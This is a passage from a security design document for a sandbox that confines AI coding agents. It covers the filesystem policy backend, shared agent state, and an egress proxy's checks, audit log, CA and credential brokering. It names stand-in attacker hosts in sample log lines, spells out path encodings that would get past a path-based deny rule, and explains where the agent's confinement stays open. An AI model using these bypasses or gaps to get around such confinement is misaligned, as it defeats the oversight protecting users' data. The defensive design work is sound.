- `ko-agent-fs/bpf/doc/evidence.md` says what the suites measured.
- The backend serves the podman machines of macOS and Windows alone. Native Linux keeps the FUSE
  backend (`doc/TODO.md`, "The BPF backend's later versions").

What an auditor trusts, and how each link is checked:

- **The program.** The program is C, `ko-agent-fs/bpf/policy.bpf.c`. `--build` compiles it in the
  machine against the machine's own kernel.
  - At load, the kernel's verifier refuses any read or write outside the bounds that the verifier
    proves. So a memory fault of the C kind is a failed launch, never a running program.
  - The classifier is compiled a second time for the host and run through the workspace policy's
    corpus (`ko-agent-fs/policy/tests/bpf_equivalence.rs`), so the two classifiers decide alike.
- **The controller is privileged and parses nothing of the workspace.** The controller runs once
  per launch under the machine's `sudo -n`. The session has no path to the controller. The
  controller:
  - loads the object from beside itself;
  - fills the maps from records that the unprivileged guard compiled
    (`ko-agent-fs --resolve --bpf-records`), and from the identities that the controller reads for
    itself;
  - attaches below the invoking user's slice alone, and pins;
  - exits before the container exists.
- **No container process runs before the policy is proven.**
  - A read-back runs with the controller's privileges and none of the controller's code. The
    read-back lists what the kernel attached. The read-back compares the hook set, each program's
    tag and each program's read-only data with the installed object's. The read-back compares each
    map's shape and contents with the launch's records.
  - The four maps that hold the records are frozen against writes from user space.
  - Then the launcher's own process, below the attach cgroup, runs one refused operation per hook
    and one write per rule line against a fixture under the state root.
  - A difference ends the launch with nothing bound writable.
  - The container then starts only once the machine has read the cgroup of the container's
    initialized process, below the attach cgroup.
- **The policy outlives the controller and cannot lapse without root.** A pinned link detaches only
  when its cgroup is removed, and a cgroup that holds the container cannot be removed. A read-only
  session (`--workspace=read-only,bpf`) gets a policy that records no root. So a descriptor that a
  live session passes to the read-only session opens nothing on the share for writing.
- **Two backends never share a tree.** Every sandbox container carries labels that name its
  settings, its volume and the identity of each directory that it mounts from the host. Under one
  launch lock per machine, a launch is refused beside a live session of the other backend or socket
  setting:
  - when that session shares the volume or a mount;
  - when that session's recorded path no longer names its directory.

  Three further cases:
  - A container of an earlier launcher carries no labels. Such a container ran the FUSE backend with
    no socket setting. So a `bpf` or `unix-socket` launch is refused beside that container, and a
    FUSE backend launch is not.
  - A read-only launch that the probe leaves without a policy counts as a FUSE backend session too.
  - The later launch is the one that refuses. An earlier launcher started beside a `bpf` or
    `unix-socket` session refuses nothing.
- **The installation and the program set verified ahead.** `--build` installs the binaries at
  `~/.local/share/ko-agent-sandbox/bpf/` in the machine. To remove them, run
  `podman machine ssh rm -r .local/share/ko-agent-sandbox/bpf`.
  - `--build` records the installed object's tags under the running kernel.
  - `--build` keeps one program set loaded and verified ahead of the next launch. That launch takes
    the program set by renaming the set's pin directory, after the read-back checked the set.
  - A `bpf` launch refuses an installation whose source id is not its own bundle's, as the FUSE
    backend's `--version` is checked.
  - A `bpf` launch also refuses an installation whose tags were recorded under another kernel than
    the one the machine runs, as after `podman machine os upgrade` or `wsl --update`.
  - Either refusal names `--build`.
- **Refused routes the hooks do not hold.**
  - The seccomp profile refuses xattrs, ACLs and file flags ("The default's seccomp profile",
    below).
  - The machines' shares answer `ENOTTY` to the filesystem ioctls that change a file through a
    read-only descriptor. The every-hook suite measured that answer on both machines.
  - A seccomp refusal of those ioctls stays unbuilt in the first version. `doc/TODO.md` says what
    reopens that decision ("Attribute routes as `--workspace` values, spending the free hook
    slots").
  - A FIFO on the share is refused by type: its creation, its opening, a change of its times, and
    under `unix-socket` its receipt (`doc/limitations.md`, "No FIFO in the workspace").

What is measured: the sections "One hook on macOS" to "Launcher on WSL" of
`ko-agent-fs/bpf/doc/evidence.md`, including the launcher's own rows. Each section of the policy,
lifecycle, benchmark and launcher suites binds its figures to the digest of its sources' code.
`fuse` stays the default of both modes until the release decision that `doc/TODO.md` plans ("The BPF
backend as the default").

**What is inside TLS, for the hosts that stay opaque.**

- A `tunnel` host is deliberately not inspected. So the proxy sees only the handshake, and cannot
  tell a `GET` from a `POST`.
- In the defaults, the model-provider endpoints alone are `tunnel` hosts. Those endpoints' required
  writes cannot be refused, and inspection would expose the conversation and provider tokens in
  plaintext to the proxy process.
- Inspection lets the retained log record each request's method and target. An opaque tunnel logs
  the `CONNECT` alone.
- Every other defaults host is inspected, including the bulk package registries, at a known
  per-request handshake cost. Security is not traded for performance (`doc/design.md`, "Design
  principles to preserve").

**What the persistent volume holds.**

- Every session mounts every installed agent's state read-write under the same uid, regardless of
  which agent the host launched.
- The launched command is not a security principal. Any process in the sandbox can read another
  agent's provider login, history and session metadata. Any process can also change another
  agent's configuration and MCP definitions for a later session.
- This sharing is deliberate. An agent can invoke another installed agent as a command or MCP
  server, and the called agent reuses its persisted login and configuration. The workspace, not the
  agent executable, is the isolation boundary.
- Later sessions read the volume as trusted input. Some stored state, especially MCP server
  definitions, names commands to execute.
  - `--reset` removes the workspace's default agent-state volume. Use it if that state is suspect.
  - Nothing signals when the state is suspect. `doc/plan-executable-agent-configuration.md` closes
    that gap in two phases.
- `--persistent-volume` lets workspaces share a named volume. State written by one workspace becomes
  input to every other workspace that uses that volume.
  - Each launch with the option says so, and names the options file when the option came from
    there.
  - `--reset` deliberately preserves this explicitly shared volume, whether its command line or the
    options file names the volume. So `--reset` does not remove credentials or suspect state stored
    there.
- A launch from a Git linked worktree may share the main worktree's volume, if you agree at the
  launch's prompt. The worktree's own `.git` metadata names that checkout, and the launch shows the
  checkout before asking.
  - State that a session in either checkout writes is input to every later session of both
    checkouts. That state includes provider credentials, history, configuration and MCP definitions.
  - `--reset` in the linked worktree removes only that worktree's own volume, and names the volume
    it left.
  - `--reset` in the main worktree removes the shared volume and signs every worktree out. While a
    linked worktree's session still mounts the volume, podman refuses the removal, and the reset
    reports that failed step. Run the reset again after that session ends.
  - A launch that holds no prompt (`--session-start=immediate`, or no terminal) mounts the
    worktree's own volume and says so.
- Removing a stored credential does not revoke copies already held elsewhere. Revocation remains the
  provider's operation.
- Concurrent sessions of a workspace mount the volume read-write. Writes to the same state file can
  overwrite earlier changes or leave inconsistent content.
- A `--reset` from another terminal deliberately ends live sessions. If the reset races with a
  launch, that launch fails rather than continue with weaker confinement.

**A repository that ships wide egress rules.** Review `.ko-agent-sandbox/egress/rule` before
launching in an unfamiliar workspace, as you would its build scripts.

- A `tunnel` line allows opaque traffic to its host, and a `method=` line can grant writes at its
  path.
- The sandbox enforces those grants. The sandbox does not establish that the workspace's choices are
  appropriate.

**The supply chain.**

- Base images, the JDK, and whatever `cs`, `uvx` or `npx` fetches at the agent's request are
  trusted as they arrive.
- When npm resolves a version from the registry, npm refuses a version published in the last seven
  days, even an exact pin (`min-release-age` in npm's builtin config file, which
  `container/ko-agent-sandbox/Containerfile` writes).
  - The window exists because an agent chooses to run `npx`.
  - The window costs a locked install nothing. `npm ci`, and an argument-free `npm install` with an
    up-to-date lockfile, install the lockfile's resolved versions without resolving, young versions
    included. So a lockfile written outside the sandbox brings in what it names.
  - A project's `.npmrc` shortens the window. `npm install -g` does not read that file, so a global
    install shortens the window on the command line.
- uv gets no counterpart. uv records `exclude-newer` in `uv.lock`, so an image-level window would
  make a lock written on the host fail `uv sync --locked` in a session, and a lock written in a
  session fail it on the host. A project that wants the window sets `exclude-newer` under
  `[tool.uv]`, and the project's lock carries the setting everywhere.
- npm's install-time audit is off by default (`doc/egress-rule-example/npm-audit/rule`, the audit
  line; "Reading without being able to write", below). Where a project enables the audit, its
  warnings do not stop installation.

**Container, runtime and kernel escape.** On Linux the boundary ultimately depends on rootless
podman, the OCI runtime, namespaces, seccomp and the host kernel.

- This design is not built to contain a working kernel or container-runtime exploit. If such an
  exploit enters the threat model, the answer is a stronger isolation layer (gVisor, a microVM), at
  its compatibility cost, not more flags here.
- The `--nesting=none` seccomp profile ("No containers inside the sandbox by default") is not such
  containment. The profile removes kernel interfaces from a session's reach: those that a user
  namespace unlocks, and the mount syscalls. The profile claims nothing about an exploit already
  running.
- The podman machine on macOS and Windows is not that layer either. A process that escapes the
  container into the podman machine reaches every host directory that the machine shares:
  `/Users`, `/private` and `/var/folders` on macOS, and the `C:` drive at `/mnt/c` on Windows
  (`ko-agent-fs/fuse/doc/verification-log.md` records these observed mounts).
- On macOS the podman machine's user also runs `sudo` without a password (Fedora CoreOS
  44.20260817.3.1, over `podman machine ssh`, 2026-09-22).

**Resource exhaustion.**

- The PID limit and the memory limit bound runaway process and memory use.
- CPU, disk growth in the workspace, network bandwidth, and denial of service against the host in
  general are not comprehensively bounded.

## Egress proxy

- The HTTP proxy runs in a separate container that the agent cannot modify.
- The sandbox's internal network has no route to external destinations, so outbound HTTPS
  connections must pass through the proxy.
- The proxy's container is created for each run and removed afterward. The container uses the
  reserved names described under "Silent changes to what you own".
- The audit log is appended through a bind mount of one file, in the run's directory under the
  launcher's host state. The log survives container removal.
- Every line is written to that file and to the proxy's stderr, a copy that podman removes with the
  container.
  - After the first failed write to the file, as on a full disk or a file made read-only, the proxy
    serves no new connection for the rest of the run, even if later writes succeed. A log that
    resumed would lack the lines between, and nothing in the log would say so.
  - A failed write to the stderr copy has no effect.
  - A host-command proxy has no second copy. That proxy's stderr is its log, a file in the run's
    directory ([doc/run-on-host.md](doc/run-on-host.md)). A failed write to that log has the same
    effect as a failed write to the file.
  - A proxy whose startup lines fail to be written exits before it accepts a connection.
  - A host-command proxy is not started when its log cannot be created in the run's log directory,
    and its command is refused with the reason (`RunOnHostProxy.keepAuditLog`). A log in the
    command's own directory alone would be deleted with that directory.
  - Every later request, a `CONNECT` or not, receives `403` with the reason
    `audit log cannot be written: <the I/O error>`. The reason is in the response body, which
    `ko-sandbox-egress-check` prints, and in the `Proxy-Status` field, which the host-command
    supervisor reads. The proxy stays up to give that answer, because podman removes an exited
    `--rm` container with its output, the reason included.
  - A connection whose `allow` line was written before the failure continues to its end. The proxy
    writes that line before the first relayed byte, and an inspected connection carries one
    request. The connection's `error` line, if its relay later fails, may be missing from the file.
  - The `deny` lines of the refused requests are still written to stderr, and to the file if the
    file accepts them again.

Each connection passes these checks and transitions in order:

1. `CONNECT` only: any other method gets a `400`
1. port 443 only
1. IP-literal targets are refused, not just dotted quads. The resolver also accepts `127.1` and
   `2130706433` as spellings of `127.0.0.1`, and a match on the first form alone is a known bypass
   class
1. the resolved ruleset allows the hostname, by an exact entry in its host map. The map already
   incorporates rule order, including grants that follow denials
1. DNS is resolved once to obtain the candidate addresses
1. every address that the name resolved to must be public. A name that answers with a loopback,
   RFC1918, link-local or CGNAT address is refused outright. The connection uses those validated
   addresses without a second lookup
1. `200 Connection Established` accepts the `CONNECT`. This response is the last plaintext HTTP
   response on the client connection, and the client must then begin TLS
1. the client's TLS ClientHello is parsed within a fixed byte budget
1. Encrypted ClientHello is refused, because it would hide the name that actually selects a
   backend. GREASE ECH, the dummy extension that a browser sends by default (RFC 9849, 6.2), is
   refused too, since it is indistinguishable by design. So a browser-driven program fails on every
   host
1. SNI must be present, and must equal the hostname in the `CONNECT`.
   - This step also keeps a destination named by address out of both treatments. SNI carries no
     address, so a client connecting to an address sends no SNI, and this step refuses the hello.
   - A leaf can name an address (an `iPAddress` subject alternative name). So inspecting such a
     destination is a decision that this lifecycle has not taken, not a limit of the protocol
1. only then does the connection become a tunnel: inspected for an inspected host, opaque for a
   `tunnel` host

Steps 8-11 prevent `CONNECT allowed.example:443` from carrying a TLS handshake for another name at
the same address. These checks follow the `200`, so a failure closes the connection. Before the
`200`:

- malformed or non-CONNECT requests receive `400`;
- policy refusals receive `403` with the reason and suggested next step;
- DNS or connection failures receive `502`.

Each of these responses also carries the reason in an RFC 9209 `Proxy-Status` field, and so does
each response that the proxy generates inside an inspected connection
([doc/design.md](doc/design.md#proxy-status-on-the-proxys-own-responses)).

Clients often hide failed-CONNECT response bodies, so the sandbox image provides
`ko-sandbox-egress-check <host>` to read them ([README.md](README.md#reference), `--egress-check`).

With `HTTPS_PROXY` set where the launcher runs, step 6 connects through the upstream proxy, with a
`CONNECT` that names the validated numeric address (`doc/egress-proxy.md`, "Through an upstream
proxy"):

- The local checks still decide what is allowed, and the upstream proxy does not resolve the origin
  hostname. The returned tunnel carries the same steps 8 to 11. The upstream proxy cannot override
  a local refusal.
- An upstream refusal or connection failure produces `502`, with no direct-connect fallback.
- The variable reaches the proxy container's environment by name, as a forwarded host value reaches
  the sandbox ("Credential theft", above). So the variable's userinfo is in no argument. The proxy
  keeps the credential in memory and prints the endpoint alone.
- The sandbox never sees the variable. The sandbox's own proxy variables name the per-run proxy, as
  `SessionBoundaryTest` asserts.

### The audit line grammar

Connection and inspected-request events use one log line each. The leading fields are stable for
tooling. The trailing explanation is meant for people and may change:

    <instant> allow <host> <method> [<target>] [inject=<names>] -> <ip>
    <instant> deny  <host> <method> [<target>] <why>
    <instant> error <host> <method> [<target>] <why>

Timestamps use UTC with second precision, for example `2026-08-26T11:59:38Z`. Every line carries a
timestamp, including startup lines; the examples below omit it.

- **`<host>`** is the `CONNECT` target as the sandbox requested it. The field shows what was asked
  for, not necessarily a hostname that the ruleset allows.
- **`<method>`** is `CONNECT` for tunnel-level events, and the inspected method inside a tunnel.
  - `-` fills a field that the connection ended before revealing. So the field never carries a token
    that the proxy did not allow.
  - The text names a refused method instead.
- **`<target>`** appears exactly when a parsed inspected request exists, query string included.
  - The URL is the message that an allowed `GET` can carry ("Exfiltration through allowed network
    traffic", above). So the log records the URL whole, which is also why the log files are
    owner-only.
  - Whole, but not arbitrary: the parser refuses a C0 control character or DEL in a request target,
    in a field value (HTAB excepted) or in a `CONNECT` authority.
- **`inject=<names>`** marks an inspected request forwarded with a brokered credential substituted.
  The field names the bindings whose values the request carries ("Who holds a brokered value",
  below).
  - No value is logged. A placeholder spelled as the launch issued it, anywhere in the target,
    prints as the binding's name. So does a bound parameter's value: `?sig=AZURE_SAS_SIG`. A
    percent-escaped spelling of a placeholder prints as sent.
  - A request denied after the substitution sent no credential, and its line has no `inject`.
- Every field, `<why>` included, escapes these characters as a Java or Scala string literal would
  (`\t`, `\u001b`, `\u202e`, `\"`, `\\`): a C0 or C1 control character, DEL, U+2028, U+2029, a
  format character (the bidi controls, zero-width characters, U+00AD), an unpaired surrogate, `"`
  and `\`.
  - Nothing that a request or an origin sends can split a line's fields with a tab, break the line,
    or rewrite, reorder or hide part of the line on the terminal or in the editor reading it.
  - A field reads back exactly.
- **`deny`** records a protocol or policy refusal. **`error`** records a connection, origin or relay
  failure without such a refusal. So a count of `deny` lines includes malformed requests, but
  excludes ordinary network failures.

The stages emit the following kinds of events:

    # the CONNECT checks — lifecycle steps 1 to 6
    deny - - GET non-CONNECT request
    deny example.com CONNECT port 8080
    deny 169.254.169.254 CONNECT IP-literal target
    deny tracker.example CONNECT host not allowed
    deny telemetry.example CONNECT host denied (rule: deny https://**.example/)
    deny internal.corp CONNECT resolved to non-public address 10.0.0.5
    deny github.com CONNECT audit log cannot be written: No space left on device

    # the TLS checks — steps 8 to 10, after the 200, before any tunnel
    deny github.com CONNECT SNI evil.example differs from target
    deny github.com CONNECT encrypted ClientHello

    # tunnels and inspected requests — step 11 onward
    allow api.anthropic.com CONNECT -> 160.79.104.10
    allow github.com GET /owner/repo?tab=readme -> 140.82.112.3
    allow api.github.com GET /user inject=GH_TOKEN -> 140.82.112.5
    deny github.com POST /owner/repo.git/git-receive-pack POST not granted
    deny github.com GET /r.git/info/refs?service=git-receive-pack git push ref discovery
    deny github.com GET /r.git/info/refs?service=git-upload-pack git fetch ref discovery
    deny github.com GET /owner/repo read not granted
    deny github.com GET /owner/repo request body framing header
    deny registry.npmjs.org PUT /lodash PUT not granted
    deny github.com GET /owner/repo Host header evil.example
    deny storage.googleapis.com GET /other-bucket/key path under no line
    deny storage.googleapis.com GET /my-bucket/../other-bucket/key a dot segment in the path

    # infrastructure — error, never deny
    error internal.example CONNECT resolution: unknown host
    error api.anthropic.com CONNECT tried 160.79.104.10 203.0.113.7: connection timed out
    error github.com CONNECT tried 140.82.112.3: upstream proxy returned 403
    error github.com CONNECT tried 140.82.112.3: upstream proxy http://proxy.example:3128: refused
    error github.com GET /owner/repo origin: certificate expired
    error github.com GET /owner/repo relay: connection reset
    error github.com GET /big.tar relay: 8192-byte response truncated: body ended 100 bytes early
    error github.com - client closed before sending a request

- The `relay:` error records response-body framing and I/O failures after the proxy forwarded the
  response head, including timeouts and resets in close-delimited bodies. The proxy aborts the
  client connection without a clean TLS shutdown, so the client can detect the incomplete download.
- A client closing without sending a request is not a refusal, since pooled clients routinely
  discard unused connections. The proxy logs such a close as `error`. A partial request header
  instead counts as malformed input, and the proxy logs it as `deny`.
- A refused request's `403` body is the agent's copy of `<why>`, with the next step under it
  (`RefusalAdvice` in the proxy). The advice is for the agent and never enters the log. The log is
  for the person who has this document.

Startup lines precede these events and use a separate format. They record, in order:

1. the transport: direct, or the upstream proxy and its addresses resolved at startup;
1. the listening port;
1. the ruleset in `--print-ruleset` format, its digest, and summary counts. The digest excludes
   metadata about the workspace's rule file, so different files that resolve to the same ruleset
   have the same digest;
1. grants exceeding a host's defaults;
1. warnings;
1. the inspection summary;
1. the brokered credentials' bindings, when a launch has any.

The lines have no peer-address field, because the per-run internal network has one client
container.

### Reading without being able to write

The catalog grants `read git-fetch` to three Git hosting services:

1. `github.com`
1. `codeberg.org`
1. `gitlab.com`

These grants allow `git clone` and `git fetch`. An opaque tunnel would also carry `git push`, and so
would let the agent upload workspace contents wherever the agent has access.

The rest of the catalog has `read` alone, which allows `GET` and `HEAD` with no body and no `POST`
at all:

- the GitHub content hosts;
- the documentation and reference sites;
- the content CDNs;
- the container-image pull hosts.

The `POST` that a grant allows must not reach a host without that grant. On a content host whose
paths are anyone's to choose, a path that mimics `git-upload-pack` would pass under the git rule.

The proxy image's `defaults/host` file is the canonical built-in membership, grants included, with
the reason beside each line. "What is inside TLS", above, says what stays opaque and why.

For each inspected request, the proxy terminates TLS and checks the grants in the resolved scope
with the longest literal path match (`doc/egress-proxy.md`, "The rule file"):

- `read`: bodyless `GET` and `HEAD`, except the two Git discovery requests below. The exception
  covers any spelling that percent-decodes once to one of those requests, as a forge's router
  decodes before routing.
- `git-fetch`: the ref discovery and the transfer step of `clone` and `fetch`.
  - The ref discovery is `GET .../info/refs?service=git-upload-pack`.
  - The transfer step is a `POST` to a path of at least two nonempty segments followed by
    `/git-upload-pack`, with no `#` in the path. An origin that ends the path at `#` would route
    the request by what precedes the `#`.
  - Git sends fetch-negotiation data as a `POST` and receives a packfile in the response, so
    granting only `read` would prevent cloning.
  - The discovery request also requires `git-fetch`, so a clone without the transfer grant fails at
    its first request rather than its second.
- `method=POST` on GitHub's two default login rules, `/login/device/code` and
  `/login/oauth/access_token`. These rules serve GitHub's OAuth device flow, which is how Copilot
  CLI signs in.
  - The second path is GitHub's general token endpoint, shared with the web flow's code exchange.
    The web flow's redirect cannot reach the sandbox.
  - These grants are method-and-path grants. The payload limitations under "Exfiltration through
    allowed network traffic" apply here too.
  - A session can initiate device authorization for a GitHub OAuth app. Completing that flow
    requires user authorization on GitHub's device page.
- `method=` on a workspace's own line: the listed HTTP methods at that path, inspected and logged.
  The defaults have no such line beyond the login pair.
  - `doc/egress-rule-example/npm-audit/rule` is the measured case: a `POST` to the audit endpoint
    that the image's npm uses at install time. Older npm endpoints are refused and logged without
    failing the installation.
  - Audit is off by default because the request sends a package and version inventory. The
    inventory includes names that the registry's own `GET`s never carried, such as private-registry
    and Git dependencies in a lockfile. The request does not send dependency edges. Enabling
    install-time vulnerability warnings allows that disclosure.
- Nothing else.
  - `POST .../git-receive-pack` is the push, and is refused. The push's ref discovery,
    `GET .../info/refs?service=git-receive-pack`, is refused too, although it is a `GET`, so that
    `git push` fails at its first request rather than its second.
  - The exception is a line that grants `POST` at the repository: the workspace's own visible
    grant.
  - `PUT`, `PATCH` and `DELETE` are refused where no line grants the method, and so is every other
    `POST`.

A policy refusal returns `403` inside the tunnel, with the reason and suggested next step, and
produces a `deny` audit line ("The audit line grammar", above). Malformed HTTP receives `400` and is
also logged as `deny`. Inspection records requested methods and targets, rather than only
connections to the host.

Consequences under the default grants follow. A workspace can explicitly grant the relevant methods.

- GraphQL requests using `POST` are refused, including read-only queries. Distinguishing a query
  from a mutation would require interpreting the payload, which the proxy does not do. If an
  endpoint supports GraphQL over bodyless `GET`, `read` governs those requests, just like REST
  reads. Each host's documentation describes its authentication requirements:
  - [GitHub's GraphQL API](https://docs.github.com/en/graphql/guides/forming-calls-with-graphql)
    requires authentication.
  - [GitLab](https://docs.gitlab.com/api/graphql/) supports anonymous queries, so refusing `POST`
    queries can cost GitLab reads even without a stored token.
  - Codeberg uses the [Forgejo API](https://forgejo.org/docs/latest/user/api/usage/). The Forgejo
    API's bodyless REST `GET` reads remain allowed under the defaults.
- The LFS batch endpoint is not opened. The endpoint takes a `POST` whose body chooses between
  download and upload: another request whose meaning is in the body. Public-repository LFS batch
  downloads can be anonymous.
  - The absence of git-lfs from the image does not enforce this restriction. An agent can fetch the
    git-lfs static binary through release-assets.githubusercontent.com, but the proxy still refuses
    the binary's batch requests.
  - The refusal costs `git lfs pull`, without making all LFS content unreachable:
    - GitHub serves individual LFS files at media.githubusercontent.com, which is in the defaults.
    - GitLab documents GET downloads through its
      [raw-file API](https://docs.gitlab.com/api/repository_files/#get-raw-file-from-repository),
      with `lfs=true`, and its
      [archive API](https://docs.gitlab.com/api/repositories/#get-file-archive),
      with `include_lfs_blobs=true`.
  - These downloads remain subject to the destination rules, including any redirected destination.
  - `doc/TODO.md` records the download-only inspection that would allow LFS batch downloads.

Each inspected connection carries one request and its response, then closes. The proxy forwards the
request with validated body framing:

- The proxy sends `Connection: close` to the origin, and validates the response's framing to detect
  truncation. This removes connection reuse as a request-smuggling path, without assuming that the
  origin parses every byte identically.
- Ambiguous framings are refused rather than resolved: a `Content-Length` beside a
  `Transfer-Encoding`, conflicting `Content-Length` values, or a `Content-Length` with anything but
  digits in it, which the origin receives as written.
- ALPN is restricted to `http/1.1` so the proxy can parse the request.
- `Upgrade` is refused, so no WebSocket or cleartext HTTP/2 can turn the one inspected request into
  a stream the proxy no longer reads.

### Who holds the CA key

- The launcher keeps the CA private key on the host.
- A host command's proxy has a CA of its own, whose key is never written ("Run on host", below).
- Each workspace gets its own CA, created under `~/.local/state/ko-agent-sandbox/tls/<workspace>`
  (`%LOCALAPPDATA%` on Windows).
  - That directory is outside the workspace. So the agent can neither read the key that signs what
    the agent is shown, nor replace the key for the next session.
  - A CA created for one workspace cannot be used to read another workspace's traffic.
- The launcher reissues the CA a month before expiry. The launcher reissues the leaf with the CA, a
  month before the leaf expires, or when the resolved inspected set changes.

What reaches the proxy container is one leaf certificate and that leaf's own key, bind-mounted
read-only.

- The leaf names exactly this workspace's resolved inspected set: the inspected hosts after the
  workspace's profile and `egress/rule` apply.
- The launcher does not keep a copy of that set. At launch the launcher reads the hosts off the
  `allow` lines of the proxy image's own `--print-ruleset`, under the same rules. So a custom proxy
  image, or a workspace that adds an inspected host, gets a matching leaf, and no second list can
  drift.
- The proxy still refuses to start unless the certificate names exactly the inspected set of the
  ruleset it resolved:
  - a missing name would cause a TLS error for an allowed inspected host;
  - an extra name would let the proxy authenticate as a host outside its inspection set,
    potentially including an opaque model endpoint.

The sandbox trusts that CA through:

- a bundle assembled on the host from the image's own CA bundle plus the workspace's CA, mounted
  over `/etc/ssl/certs/ca-certificates.crt`;
- for the programs with a trust store of their own rather than the system's, variables that point
  at the same file: `SSL_CERT_FILE`, `CURL_CA_BUNDLE`, `REQUESTS_CA_BUNDLE`, `NODE_EXTRA_CA_CERTS`
  and `GIT_SSL_CAINFO`.
  - The Codex CLI, a statically linked binary, reads `SSL_CERT_FILE` (or its own
    `CODEX_CA_CERTIFICATE`).
  - Measured with codex-cli 0.155.1 signed in with an API key, against a local server whose CA is
    in that file alone (2026-09-22): Codex's HTTPS requests and its websocket connection both
    complete the TLS handshake. Without the variable, both fail with `UnknownIssuer`.
  - Under the default rules Codex's OpenAI hosts are tunnels, so Codex meets no leaf of this CA.

The image's JDK reads none of the above: a JVM consults a `cacerts` keystore and a
`net.properties` file. So the launcher covers the JDK with the same technique, one layer over:

- The image ships `ko-sandbox-jdk-use-proxy`. The script imports the CA into one JDK's store with
  that JDK's own `keytool`, and appends the proxy to that JDK's `net.properties`.
- The launcher runs the script on the image's own JDK in a throwaway container with no network,
  copies the files out, and mounts them read-only over the originals.
  - `JAVA_HOME` is read from the image's own environment. So the launcher never hardcodes the
    arch-dependent Temurin directory, and an image without a JDK skips the mounts.
  - Every root that the image shipped survives. Dropping a root would stay invisible until a TLS
    client reaches an origin signed by that public CA, so the mounted-store test checks the
    complete root set.
  - The store is prepared at launch rather than built into the image, since the per-workspace CA
    postdates the image.

Programs not covered by the launcher's prepared trust stores need separate handling:

- A JVM that the agent installs itself (`cs java --jvm ...`) brings its own untouched store.
  - `ko-sandbox-jdk-use-proxy` gives that JVM both the CA and the proxy from inside, in one command.
  - The certificate that the script reads is mounted beside the agent instructions. That
    certificate is the same public one already inside the bundle.
- Maven, which a workspace's `./mvnw` brings, trusts what its JDK trusts. But by default Maven takes
  the proxy from its settings, not from `HTTPS_PROXY` or the JDK's `net.properties`.
  - The image ships a `~/.m2/settings.xml` that names the proxy
    (`container/ko-agent-sandbox/m2/settings.xml`).
  - On the host the supervisor passes the resolver's `aether.connector.http.useSystemProperties`
    instead (`doc/run-on-host.md`, "Maven").
- A GraalVM native image, such as the `cs` and `scala` launchers, has no `conf/` and reads no
  variable. So the proxy and CA settings travel as `-D` options in `KO_AGENT_SANDBOX_JAVA_OPTS`,
  which the agent passes by hand.

### Who holds a brokered value

A value bound with `--egress-cred` is held in memory by the launcher, the runner, a supervisor
starting a proxy, and each proxy given the value:

- No file holds the value, and neither does the environment or an argument of any process that the
  launcher starts. The launcher removes `NAME` from the environment that its processes inherit, and
  the value travels by pipe (`doc/design.md`, "Credential brokering at the egress proxy").
- The environment that the launcher was started with keeps the value as the user gave it, for as
  long as a resident launcher runs. Withholding changes only what the launcher's children inherit.
- Each proxy is given the bindings whose host it inspects, and no other.
- A proxy is the ruleset's single point of trust, and also holds the credentials sent through it.
  Compromising the proxy compromises both.

Brokering protects the value only while the rewrite is the one route by which a host credential
enters a request. No other host channel that authenticates, such as an SSH agent's socket or a key,
is mounted ("Credential theft"; `SessionBoundaryTest`'s check of every mount).

What brokering leaves open:

- The agent uses the credential at the bound host, within the methods granted there, on every
  repository or resource its issuer's scope reaches.
- The placeholder tells the session that `NAME` exists and where the proxy substitutes it.
- The placeholder of a value with a recognized token prefix is in the value's format. The
  placeholder shows the value's length, where its `-`, `.`, `_` and `~` are, and whether each other
  character is a digit, an upper-case letter or a lower-case letter. Any other placeholder shows
  nothing of its value (`doc/egress-proxy.md`, "Where the value goes").
- A response that echoes the credential reaches the sandbox, because responses are not rewritten. A
  bound header that the service stores or sends back is such a route (`doc/egress-proxy.md`, "Where
  the value goes").

### Why the rules are per workspace, in the workspace, and read-only

A single shared rule file would combine the access requirements of otherwise unrelated workspaces.
Per-workspace rules let a repository that only reads public documentation use different grants from
a repository that holds credentials. The rules can be reviewed in a pull request alongside the code
they serve.

Without separate protection, an agent with a writable workspace could rewrite the rules for the next
session. The workspace-mode protections prevent this ("A workspace loosening its own confinement",
above). The launcher also rejects:

- a symlink or any other non-directory object at the boundary-directory path;
- an unrecognized entry, such as a misspelled `egres/`, notes or a backup. Such an entry fails the
  launch instead of being silently ignored.
  - The same rule applies within `egress/` (`doc/egress-proxy.md` lists the refusals).
  - Dot-named editor and OS metadata are excepted, since no configuration will ever be named that
    way.

What remains is "A repository that ships wide egress rules", above.

### Adding hosts, not patterns

The rule file's lines name exact hostnames, as URLs. The one wildcard is `**.domain`, on the denial
side: `deny https://**.domain/`. This asymmetry is deliberate.

Exact-host grants make the allowed destinations explicit and enumerable for review. Wildcard
grants would also allow matching hosts added later:

- For a shared apex like a cloud provider's, `allow https://*.example.com/` could allow names that
  an attacker can register or take over. The breadth is in the grant, not the matcher, so no careful
  pattern syntax removes it.
- For an inspected host, an open-ended subtree also cannot satisfy the design's certificate
  check: the leaf issued at launch must enumerate the inspected host set.

Grants therefore name exact hosts, and no profile reaches a host that no rule names
(`doc/design.md`, "No profile that allows hosts no rule names").

A line grants exactly its words, under the path it names, and nothing else on the host. Nothing is
implied, so a line with no grant word is refused rather than read as `read`. `doc/egress-proxy.md`,
"The rule file", has the grammar, the order in which the lines apply, and how a request finds its
line. What follows is why.

A `deny` names a host or a subtree, never a path. A grant by path needs one spelling that works,
while a denial by path needs every spelling that reaches the tenant. The proxy compares literally,
and cannot know those spellings. With the defaults granting `git-fetch` on `github.com`, these
spellings would bypass a hypothetical `deny https://github.com/secret-org/`:

- `/%73ecret-org/…`, which misses the deny, matches the root line and is allowed, because GitHub
  decodes `%73` to `s`;
- `/Secret-Org/…`, because GitHub folds case;
- `/secret-org./` and `/secret-org;v=1/`, on an origin that strips a segment's trailing dot or a
  `;parameter`;
- `/orgs/secret-org` or a search page, which reach the organisation under paths the deny never
  named.

Each such spelling gains access: a denial by path fails open. The ordering that the grammar gives
instead, a host-wide `deny` with the narrower `allow` beneath it, fails closed. Every spelling that
misses the narrower allow stays governed by the host-wide deny and is refused. A case-folding
keyword would close one of these spellings on one origin, and none of the others.

A path on an `allow` line, written after a host-wide `deny`, restricts access relative to a
whole-host grant. The path does not prove tenant isolation for every possible origin. The proxy
checks a request path's syntax and matches the path literally, without reproducing the origin's
handling of percent-escapes, `..`, backslashes, empty segments or letter case:

- A rule's path must be in canonical form, one spelling per path, or the launch fails
  (`doc/egress-proxy.md`, "The rule file").
- Checks on request spellings depend on the matched scope (`doc/egress-proxy.md`, "The rule file").
  A read under the root is exempt: there the read has the host's least grants, and gains nothing by
  decoding.
- The rule costs two kinds of path:
  - a path that the origin would have accepted and this rule refuses;
